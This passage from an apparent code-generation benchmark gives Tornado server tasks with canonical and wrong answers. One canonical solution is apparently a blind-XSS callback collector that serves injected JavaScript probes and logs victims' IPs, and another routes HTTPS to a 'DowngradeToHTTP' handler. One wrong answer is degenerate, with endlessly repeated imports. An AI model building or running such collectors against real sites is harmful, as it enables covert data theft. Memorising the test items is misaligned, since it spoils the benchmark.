    "Instruction": "Task Description: Create a Python class that implements an HTTP server using the Tornado framework to handle backend requests and serve static content, with support for both HTTP and HTTPS connections.\n\nClass Description: The HTTPServer class initializes and runs a Tornado-based web server that can handle backend API requests and serve static files, with separate configurations for HTTP and HTTPS ports.\n\nAttributes:\n- ip: str - The IP address to bind the server to\n- port: int - The HTTP port number to listen on\n- ssl_port: int - The HTTPS port number to listen on\n- template: object - An object providing template paths for static content\n- em: object - An event manager object providing backend functionality\n\nMethods:\n- __init__(ip: str, port: int, ssl_port: int, template: object, em: object) -> None - Initializes the server with configuration parameters\n- run() -> None - Starts the HTTP and HTTPS servers and begins the I/O loop\n\nAdditional Class Descriptions:\n\nBackendHandler (extends tornado.web.RequestHandler):\n- Purpose: Handles POST requests to the backend API endpoint\nAttributes:\n- em: object - Event manager object providing backend methods\nMethods:\n- initialize(em: object) -> None - Initializes the handler with the event manager\n- post() -> None - Processes POST requests, executes backend methods, and returns JSON responses\n\nCaptivePortalHandler (mentioned but not shown in reference):\n- Purpose: Handles requests to the captive portal (implementation not shown)\n\nDowngradeToHTTP (mentioned but not shown in reference):\n- Purpose: Handles HTTPS requests by downgrading them to HTTP (implementation not shown)",
    "Canonical_solution": "import tornado.web\nimport tornado.httpserver\nimport tornado.ioloop\nimport json\nfrom tornado.escape import json_decode, url_unescape\n\nclass BackendHandler(tornado.web.RequestHandler):\n    def initialize(self, em):\n        self.em = em\n\n    def post(self):\n        json_obj = json_decode(self.request.body)\n        response_to_send = {}\n        backend_methods = self.em.get_backend_funcs()\n        \n        for func_name in list(json_obj.keys()):\n            if func_name in backend_methods:\n                callback = getattr(backend_methods[func_name], func_name)\n                response_to_send[func_name] = callback(json_obj[func_name])\n            else:\n                response_to_send[func_name] = \"NotFound\"\n\n        self.write(json.dumps(response_to_send))\n\nclass HTTPServer:\n    def __init__(self, ip, port, ssl_port, template, em):\n        self.ip = ip\n        self.port = port\n        self.ssl_port = ssl_port\n        self.template = template\n        self.em = em\n\n    def run(self):\n        app = tornado.web.Application(\n            [\n                (r\"/backend/.*\", BackendHandler, {\"em\": self.em}),\n                (r\"/.*\", CaptivePortalHandler),\n            ],\n            template_path=self.template.get_path(),\n            static_path=self.template.get_path_static(),\n            compiled_template_cache=False,\n            ui_methods=uimethods)\n        app.listen(self.port, address=self.ip)\n\n        ssl_app = tornado.web.Application([(r\"/.*\", DowngradeToHTTP)], port=self.port)\n        https_server = tornado.httpserver.HTTPServer(\n            ssl_app,\n            ssl_options={\n                \"certfile\": constants.PEM,\n                \"keyfile\": constants.PEM,\n            })\n        https_server.listen(self.ssl_port, address=self.ip)\n\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "```python\nimport tornado.ioloop\nimport tornado.web\nimport tornado.httpserver\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.httpclient\nimport tornado.gen\nimport tornado.escape\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport tornado.websocket\nimport tornado.process\nimport tornado.concurrent\nimport tornado.locks\nimport tornado.httpserver\nimport tornado.httpclient\nimport tornado.httputil\nimport tornado.options\nimport tornado.template\nimport tornado.web\nimport"
  },
  {
    "Task_id": 242,
    "Instruction": "Task Description: Create a Tornado-based HTTP server class that can handle incoming HTTP requests and respond appropriately. The server should be configurable to run on a specified port and include a basic request handler for demonstration purposes.\n\nClass Description: The TornadoHTTPServer class encapsulates the functionality to create and run a Tornado web server. It initializes the server with a default port (configurable), sets up request handlers, and provides a method to start the server.\n\nAttributes:\n\napp: [tornado.web.Application] - The Tornado web application instance that manages request handlers and routing.\nhttp_server: [tornado.httpserver.HTTPServer] - The HTTP server instance that will listen for incoming requests.\n\nMethods:\n\n__init__: [Name](port: int = 8000) -> None - Initializes the TornadoHTTPServer instance. Sets up the application with a default route handler and prepares the HTTP server.\nInput Parameters:\n  - port: int (default=8000) - The port number on which the server will listen.\nReturn Value: None\n\nrun: [Name]() -> None - Starts the HTTP server on the specified port and begins the I/O loop to handle incoming requests.\nInput Parameters: None\nReturn Value: None",
    "Canonical_solution": "import tornado.httpserver\nimport tornado.ioloop\nimport tornado.options\nimport tornado.web\nfrom tornado.options import define, options\n\ndefine(\"port\", default=8000, help=\"run on the given port\", type=int)\n\nclass IndexHandler(tornado.web.RequestHandler):\n    def get(self):\n        greeting = self.get_argument('greeting', 'Hello')\n        self.write(greeting + ', welcome you to read: www.itdiffer.com')\n\nclass TornadoHTTPServer:\n    def __init__(self, port=8000):\n        options.port = port\n        self.app = tornado.web.Application(handlers=[(r\"/\", IndexHandler)])\n        self.http_server = tornado.httpserver.HTTPServer(self.app)\n\n    def run(self):\n        self.http_server.listen(options.port)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "```python\nimport tornado.ioloop\nimport tornado.web\nimport tornado.httpserver\n\nclass TornadoHTTPServer:\n    def __init__(self, port: int = 8000):\n        self.app = tornado.web.Application([\n            (r\"/\", DefaultRouteHandler),\n        ])\n        self.http_server = tornado.httpserver.HTTPServer(self.app)\n        self.http_server.listen(port)\n\n    def run(self):\n        tornado.ioloop.IOLoop.current().start()\n\nclass DefaultRouteHandler(tornado.web.RequestHandler):\n    def get(self):\n        self.write(\"Hello, World!\")\n```\n"
  },
  {
    "Task_id": 243,
    "Instruction": "Task Description: Implement a Tornado-based HTTP server with request handlers for processing JavaScript callbacks and serving dynamic homepage content.\n\nClass Description: The TornadoHTTPServer class initializes and runs a Tornado web application with two main handlers: CallbackHandler for processing POST requests containing callback data, and HomepageHandler for serving dynamic JavaScript content based on user-specific configurations.\n\nAttributes:\n- settings: [dict] - Configuration dictionary containing server settings like cookie_secret\n- app: [tornado.web.Application] - The Tornado web application instance\n\nMethods:\n- __init__: [Name](settings: dict) -> [None] - Initializes the server with given settings and sets up URL routing\n- start: [Name](port: int = 8888) -> [None] - Starts the server listening on the specified port and begins the I/O loop\n\nClass Description: BaseHandler serves as the base request handler class providing common functionality for all handlers.\n\nAttributes:\n- (Inherited from tornado.web.RequestHandler)\n\nMethods:\n- __init__: [Name](*args, **kwargs) -> [None] - Initializes the handler and sets Content-Type header based on URI\n- options: [Name]() -> [None] - Handles OPTIONS requests (empty implementation)\n- throw_404: [Name]() -> [None] - Sends a 404 response with \"Resource not found\" message\n- on_finish: [Name]() -> [None] - Cleanup method called when request finishes (closes session)\n\nClass Description: CallbackHandler processes POST requests containing callback data, either in PGP-encrypted or plain JSON format.\n\nAttributes:\n- (Inherited from BaseHandler)\n\nMethods:\n- post: [Name]() -> [None] - Processes POST requests, validates user, and handles callback data (PGP or JSON)\n\nClass Description: HomepageHandler serves dynamic JavaScript content customized for each user.\n\nAttributes:\n- (Inherited from BaseHandler)\n\nMethods:\n- get: [Name](path: str) -> [None] - Serves customized JavaScript content based on user configuration and request path",
    "Canonical_solution": "import tornado.web\nimport tornado.ioloop\nfrom tornado import gen\n\nclass BaseHandler(tornado.web.RequestHandler):\n    def __init__(self, *args, **kwargs):\n        super(BaseHandler, self).__init__(*args, **kwargs)\n        if self.request.uri.startswith(\"/api/\"):\n            self.set_header(\"Content-Type\", \"application/json\")\n        else:\n            self.set_header(\"Content-Type\", \"application/javascript\")\n\n    def options(self):\n        pass\n\n    def throw_404(self):\n        self.set_status(404)\n        self.write(\"Resource not found\")\n\n    def on_finish(self):\n        session.close()\n\nclass CallbackHandler(BaseHandler):\n    def post(self):\n        self.set_header('Access-Control-Allow-Origin', '*')\n        self.set_header('Access-Control-Allow-Methods', 'POST, GET, HEAD, OPTIONS')\n        self.set_header('Access-Control-Allow-Headers', 'X-Requested-With')\n\n        owner_user = self.get_user_from_subdomain()\n        if owner_user == None:\n            self.throw_404()\n            return\n\n        if \"-----BEGIN PGP MESSAGE-----\" in self.request.body:\n            if owner_user.email_enabled:\n                send_javascript_pgp_encrypted_callback_message(self.request.body, owner_user.email)\n        else:\n            callback_data = json.loads(self.request.body)\n            callback_data['ip'] = self.request.remote_ip\n            injection_db_record = record_callback_in_database(callback_data, self)\n            if owner_user.email_enabled:\n                send_javascript_callback_message(owner_user.email, injection_db_record)\n            self.write('{}')\n\nclass HomepageHandler(BaseHandler):\n    def get(self, path):\n        self.set_header(\"Access-Control-Allow-Origin\", \"*\")\n        self.set_header(\"Access-Control-Allow-Methods\", \"OPTIONS, PUT, DELETE, POST, GET\")\n        self.set_header(\"Access-Control-Allow-Headers\", \"X-Requested-With, Content-Type, Origin, Authorization, Accept, Accept-Encoding\")\n\n        user = self.get_user_from_subdomain()\n        if user == None:\n            self.throw_404()\n            return\n\n        new_probe = probejs\n        new_probe = new_probe.replace('[HOST_URL]', \"https://\" + self.request.headers.get('Host'))\n        new_probe = new_probe.replace('[PGP_REPLACE_ME]', json.dumps(user.pgp_key))\n        new_probe = new_probe.replace('[CHAINLOAD_REPLACE_ME]', json.dumps(user.chainload_uri))\n        new_probe = new_probe.replace('[COLLECT_PAGE_LIST_REPLACE_ME]', json.dumps(user.get_page_collection_path_list()))\n\n        if user.pgp_key != \"\":\n            with open(\"templates/pgp_encrypted_template.txt\", \"r\") as template_handler:\n                new_probe = new_probe.replace('[TEMPLATE_REPLACE_ME]', json.dumps(template_handler.read()))\n        else:\n            new_probe = new_probe.replace('[TEMPLATE_REPLACE_ME]', json.dumps(\"\"))\n\n        if self.request.uri != \"/\":\n            probe_id = self.request.uri.split(\"/\")[1]\n            self.write(new_probe.replace(\"[PROBE_ID]\", probe_id))\n        else:\n            self.write(new_probe)\n\nclass TornadoHTTPServer:\n    def __init__(self, settings):\n        self.settings = settings\n        self.app = tornado.web.Application([\n            (r\"/js_callback\", CallbackHandler),\n            (r\"/(.*)\", HomepageHandler),\n        ], cookie_secret=settings[\"cookie_secret\"])\n\n    def start(self, port=8888):\n        self.app.listen(port)\n        tornado.ioloop.IOLoop.current().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "```python\nimport tornado.web\nimport tornado.ioloop\nimport tornado.httpserver\nimport json\nimport base64\nimport pgpy\nfrom tornado.options import define, options\n\ndefine(\"port\", default=8888, help=\"run on the given port\", type=int)\n\nclass TornadoHTTPServer:\n    def __init__(self, settings):\n        self.settings = settings\n        self.app = tornado.web.Application([\n            (r\"/callback\", CallbackHandler),\n            (r\"/(.*)\", HomepageHandler),\n        ], **settings)\n\n    def start(self, port=8888):\n        http_server = tornado.httpserver.HTTPServer(self.app)\n        http_server.listen(port)\n        print(\"Server started on port\", port)\n        tornado.ioloop.IOLoop.current().start()\n\nclass BaseHandler(tornado.web.RequestHandler):\n    def __init__(self, *args, **kwargs):\n        super(BaseHandler, self).__init__(*args, **kwargs)\n        self.set_header(\"Content-Type\", \"application/json\")\n\n    def options(self):\n        pass\n\n    def throw_404(self):\n        self.set_status(404)\n        self.write(json.dumps({\"error\": \"Resource not found\"}))\n        self.finish()\n\n    def on_finish(self):\n        pass\n\nclass CallbackHandler(BaseHandler):\n    def post(self):\n        user = self.get_argument(\"user\", None)\n        if not user:\n            self.throw_404()\n            return\n\n        data = self.request.body\n        if data.startswith(b\"-----BEGIN PGP MESSAGE-----\"):\n            # Handle PGP-encrypted data\n            pass\n        else:\n            # Handle plain JSON data\n            pass\n\nclass HomepageHandler(BaseHandler):\n    def get(self, path):\n        user = self.get_argument(\"user\", None)\n        if not user:\n            self.throw_404()\n            return\n\n        # Serve customized JavaScript content based on user configuration\n        pass\n```"
  },
  {
    "Task_id": 244,
